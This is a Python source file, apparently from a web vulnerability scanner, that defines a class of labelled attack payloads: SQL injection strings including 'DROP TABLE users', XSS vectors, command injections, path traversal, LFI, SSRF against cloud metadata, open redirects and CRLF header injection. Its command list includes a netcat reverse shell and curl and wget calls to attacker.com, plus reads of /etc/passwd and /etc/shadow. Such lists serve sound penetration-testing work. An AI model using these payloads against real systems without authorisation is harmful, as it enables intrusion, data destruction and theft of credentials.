class Payloads:
    SQL = [
        ("' OR '1'='1", "Basic SQLi"),
        ("' OR '1'='1' --", "SQLi with comment"),
        ("' UNION SELECT NULL--", "Union based"),
        ("' UNION SELECT NULL,NULL--", "Union 2 columns"),
        ("' UNION SELECT NULL,NULL,NULL--", "Union 3 columns"),
        ("admin' --", "Admin bypass"),
        ("' OR 1=1--", "Numeric SQLi"),
        ("' OR '1'='1' ORDER BY 1--", "Order by test"),
        ("' AND SLEEP(5)--", "Time based (MySQL)"),
        ("' WAITFOR DELAY '00:00:05'--", "Time based (MSSQL)"),
        ("' OR '1'='1' AND SLEEP(5)--", "Time based with condition"),
        ("' UNION SELECT @@version--", "Version disclosure"),
        ("' UNION SELECT database()--", "Database name"),
        ("' UNION SELECT user()--", "Current user"),
        ("'; DROP TABLE users--", "Destructive"),
        ("' OR '1'='1' LIMIT 1 OFFSET 1--", "Pagination bypass"),
    ]
    
    XSS = [
        ("<script>alert('XSS')</script>", "Basic XSS"),
        ("<img src=x onerror=alert(1)>", "Image XSS"),
        ("<svg onload=alert(1)>", "SVG XSS"),
        ("javascript:alert(1)", "JS protocol"),
        ("\"><script>alert(1)</script>", "Tag break"),
        ("'><script>alert(1)</script>", "Tag break 2"),
        ("<body onload=alert(1)>", "Body XSS"),
        ("<input onfocus=alert(1) autofocus>", "Input XSS"),
        ("<details open ontoggle=alert(1)>", "Details XSS"),
        ("<iframe src=javascript:alert(1)>", "Iframe XSS"),
        ("<math><mtext><a xlink:href=javascript:alert(1)>click</a>", "MathML XSS"),
        ("\"><img src=x onerror=prompt(1)>", "Prompt XSS"),
        ("<script>document.write('<img src=x onerror=alert(1)>')</script>", "Nested XSS"),
        ("<a href=\"javascript:alert(1)\">click</a>", "Link XSS"),
        ("<div onmouseover=alert(1)>hover</div>", "Mouseover XSS"),
    ]
    
    COMMAND = [
        ("; ls", "Basic command"),
        ("; ls -la", "List all"),
        ("| dir", "Windows command"),
        ("; cat /etc/passwd", "Read passwd"),
        ("; cat /etc/shadow", "Read shadow"),
        ("; whoami", "Current user"),
        ("; id", "User ID"),
        ("; pwd", "Current dir"),
        ("; uname -a", "System info"),
        ("; ps aux", "Process list"),
        ("; netstat -an", "Network connections"),
        ("; ifconfig", "Network config"),
        ("; curl http://attacker.com", "Outbound request"),
        ("; wget http://attacker.com/file", "Download file"),
        ("; nc -e /bin/sh attacker.com 4444", "Reverse shell"),
        ("; python -c 'import socket...'", "Python reverse shell"),
        ("`ls`", "Backtick injection"),
        ("$(ls)", "Bash injection"),
        ("& ping -c 5 127.0.0.1 &", "Background execution"),
    ]
    
    PATH_TRAVERSAL = [
        ("../../../etc/passwd", "Basic traversal"),
        ("../../../../etc/passwd", "Deep traversal"),
        ("..\\..\\..\\windows\\win.ini", "Windows traversal"),
        ("%2e%2e%2fetc%2fpasswd", "URL encoded"),
        ("%252e%252e%252fetc%252fpasswd", "Double encoded"),
        ("....//....//....//etc/passwd", "Double dot"),
        ("..;/..;/..;/etc/passwd", "Semicolon bypass"),
        ("file:///etc/passwd", "File protocol"),
        ("/etc/passwd", "Absolute path"),
    ]
    
    LFI = [
        ("../../../../var/log/apache2/access.log", "Apache log"),
        ("../../../../var/log/nginx/access.log", "Nginx log"),
        ("../../../../proc/self/environ", "Process env"),
        ("php://filter/convert.base64-encode/resource=index.php", "PHP filter"),
        ("data:text/plain,test", "Data wrapper"),
        ("expect://ls", "Expect wrapper"),
    ]
    
    SSRF = [
        ("http://127.0.0.1:80", "Localhost"),
        ("http://127.0.0.1:8080", "Local port"),
        ("http://169.254.169.254/latest/meta-data/", "AWS metadata"),
        ("http://localhost:3306", "MySQL port"),
        ("file:///etc/passwd", "File read"),
        ("gopher://localhost:8080/_GET / HTTP/1.0", "Gopher protocol"),
    ]
    
    OPEN_REDIRECT = [
        ("//google.com", "Protocol relative"),
        ("https://google.com", "Absolute URL"),
        ("/\\google.com", "Backslash bypass"),
        ("http://google.com@localhost", "Credentials bypass"),
        ("?next=http://google.com", "Param based"),
        ("?redirect=http://google.com", "Redirect param"),
    ]
    
    CSRF = [
        ("csrf_token=", "CSRF token kontrol"),
        ("authenticity_token=", "Rails CSRF"),
        ("__RequestVerificationToken=", "ASP.NET CSRF"),
        ("csrfmiddlewaretoken=", "Django CSRF"),
        ("_token=", "Laravel CSRF"),
    ]
    
    HEADER_INJECTION = [
        ("%0d%0aLocation: http://attacker.com", "CRLF injection"),
        ("%0d%0aSet-Cookie: session=hacked", "Cookie injection"),
        ("%0d%0aX-XSS-Protection: 0", "Header injection"),
    ]